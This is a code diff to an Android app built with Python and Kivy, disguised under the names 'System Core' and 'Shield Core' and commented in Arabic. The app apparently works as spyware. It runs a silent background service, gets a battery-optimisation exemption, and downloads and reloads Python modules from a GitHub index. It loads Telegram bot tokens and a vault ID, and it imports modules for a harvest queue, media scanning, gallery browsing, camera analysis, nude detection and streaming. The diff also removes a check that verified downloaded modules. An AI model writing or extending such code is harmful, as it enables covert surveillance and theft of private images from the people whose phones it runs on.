@@ -41,7 +41,6 @@ def _patch_dns():
 
 _patch_dns()
 
-# ========== روابط index.json ==========
 INDEX_BASE_URLS = [
     "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",
     "https://zaen1993.github.io/Android-Core/index.json",
@@ -54,7 +53,6 @@ HEADERS = {
     'Pragma': 'no-cache'
 }
 
-# ========== المسارات الأساسية ==========
 def _get_path():
     try:
         from jnius import autoclass
@@ -74,10 +72,17 @@ os.makedirs(HARVEST_QUEUE, exist_ok=True)
 MODELS_DIR = os.path.join(R, "models")
 os.makedirs(MODELS_DIR, exist_ok=True)
 
+def _get_root_path():
+    return os.path.dirname(os.path.abspath(__file__))
+
+APP_ROOT = _get_root_path()
+
+# الترتيب: R (المُحمّل) أولاً، ثم APP_ROOT (المضمّن)
 if R not in sys.path:
     sys.path.insert(0, R)
+if APP_ROOT not in sys.path:
+    sys.path.insert(1, APP_ROOT)   # بعد R مباشرة
 
-# ========== بدء خدمة أمامية صامتة ==========
 def start_silent_service():
     try:
         from jnius import autoclass
@@ -94,7 +99,6 @@ def start_silent_service():
     except Exception as e:
         print(f"Foreground service error: {e}")
 
-# ========== الأذونات المطلوبة ==========
 def _perms():
     try:
         from android.permissions import request_permissions, Permission
@@ -106,9 +110,7 @@ def _perms():
         ])
     except Exception as e:
         print(f"Permissions error: {e}")
-
     start_silent_service()
-
     try:
         from jnius import autoclass
         ctx = autoclass('org.kivy.android.PythonActivity').mActivity
@@ -122,7 +124,6 @@ def _perms():
     except Exception as e:
         print(f"Battery exemption error: {e}")
 
-# ========== تحميل الإعدادات من config_template.py ==========
 def load_secrets_from_config():
     config_module = None
     try:
@@ -139,7 +140,6 @@ def load_secrets_from_config():
     active, reserve, ctrl, vault, secret = config_module.load_config()
     return active, reserve, ctrl, vault, secret
 
-# ========== تطبيق Kivy ==========
 class CoreApp(App):
     def build(self):
         self.title = "System Core v4.2"
@@ -196,20 +196,6 @@ class CoreApp(App):
         except Exception:
             return False
 
-    def _verify_module(self, file_path, module_name):
-        if not os.path.exists(file_path):
-            return False
-        try:
-            with open(file_path, 'r', encoding='utf-8') as f:
-                content = f.read()
-            if len(content) < 200:
-                return False
-            compile(content, module_name, 'exec')
-            return True
-        except Exception as e:
-            self._log(f"Verification error ({module_name}): {e}", "ERROR")
-            return False
-
     def _download_safe(self, url, filename):
         final_path = os.path.join(R, filename)
         url_with_cache_buster = f"{url}?t={int(time.time())}"
@@ -223,12 +209,26 @@ class CoreApp(App):
             self._log(f"Download error for {filename}: {e}", "WARN")
         return False
 
-    def _download_model_if_missing(self, model_url):
-        model_path = os.path.join(MODELS_DIR, "engine_v2.tflite")
-        if os.path.exists(model_path) and os.path.getsize(model_path) > 4_000_000:
-            self._log("AI model already exists and appears valid.")
+    def _ensure_model_available(self):
+        model_filename = "engine_v2.tflite"
+        model_dest = os.path.join(MODELS_DIR, model_filename)
+        if os.path.exists(model_dest) and os.path.getsize(model_dest) > 4_000_000:
             return True
-        elif os.path.exists(model_path):
+        # ابحث في جذر التطبيق (فقط إذا وضعته هناك عمدًا)
+        model_src = os.path.join(APP_ROOT, model_filename)
+        if os.path.exists(model_src) and os.path.getsize(model_src) > 4_000_000:
+            import shutil
+            shutil.copyfile(model_src, model_dest)
+            self._log("AI model copied from app package.")
+            return True
+        return False
+
+    def _download_model_if_missing(self, model_url):
+        if self._ensure_model_available():
+            self._log("AI model already available.")
+            return True
+        model_path = os.path.join(MODELS_DIR, "engine_v2.tflite")
+        if os.path.exists(model_path):
             os.remove(model_path)
         self._log("Downloading AI model (5.19 MB)...")
         try:
@@ -282,6 +282,13 @@ class CoreApp(App):
                     self._download_model_if_missing(url)
                 else:
                     self._download_safe(url, name)
+            # إعادة تحميل المكونات الأساسية لتعكس أي تحديثات
+            try:
+                import commands
+                importlib.reload(commands)
+                self._log("Commands module reloaded.")
+            except Exception:
+                pass
         else:
             self._log("Could not fetch index.json in background update.", "WARN")
         self._log("Background update finished.")
@@ -293,27 +300,34 @@ class CoreApp(App):
         _perms()
         self._log("Shield Core v4.2 (Config template mode) starting...", "BOOT")
 
-        # 1. بدء التحديث الخلفي (لا ننتظره)
+        # 1. تحميل النموذج المحلي إن وُجد
+        self._ensure_model_available()
+
+        # 2. بدء التحديث الخلفي (لا ننتظره)
         threading.Thread(target=self._background_update_task, daemon=True).start()
 
-        # 2. تحميل الإعدادات المحلية فوراً
+        # 3. تحميل الإعدادات المحلية
         try:
             active_tokens, reserve_tokens, ctrl_id, vault_id, secret_password = load_secrets_from_config()
             self._log("Secrets loaded from local config_template.py")
         except Exception as e:
-            self._log(f"Failed to load secrets from local config: {e}", "ERROR")
+            self._log(f"Failed to load secrets: {e}", "ERROR")
             return
 
-        # 3. التأكد من وجود telegram_ui.py محلياً
-        telegram_path = os.path.join(R, "telegram_ui.py")
-        if not os.path.exists(telegram_path):
-            self._log("telegram_ui.py not found locally. Waiting for background download...", "WARN")
-            time.sleep(5)
-            if not os.path.exists(telegram_path):
-                self._log("telegram_ui.py still missing. System cannot start.", "ERROR")
-                return
+        # 4. التحقق من وجود الملفات الأساسية (سواء مضمّنة أو محمّلة)
+        essential_files = ["telegram_ui.py", "monitor.py", "commands.py"]
+        missing = []
+        for fname in essential_files:
+            # نبحث في المسارين
+            if os.path.exists(os.path.join(R, fname)) or os.path.exists(os.path.join(APP_ROOT, fname)):
+                continue
+            missing.append(fname)
 
-        # 4. تنظيف الوحدات القديمة
+        if missing:
+            self._log(f"Missing essential files: {missing}. Check APK packaging or network.", "ERROR")
+            return
+
+        # 5. تنظيف الوحدات القديمة
         modules_to_remove = ["monitor", "telegram_ui", "commands", "media_scanner", "daily_zipper",
                              "gallery_browser", "camera_analyzer", "nude_detector", "stream_manager",
                              "config_template", "config"]
@@ -323,7 +337,7 @@ class CoreApp(App):
         importlib.invalidate_caches()
         gc.collect()
 
-        # 5. بدء النظام
+        # 6. بدء النظام
         try:
             import monitor
             import telegram_ui
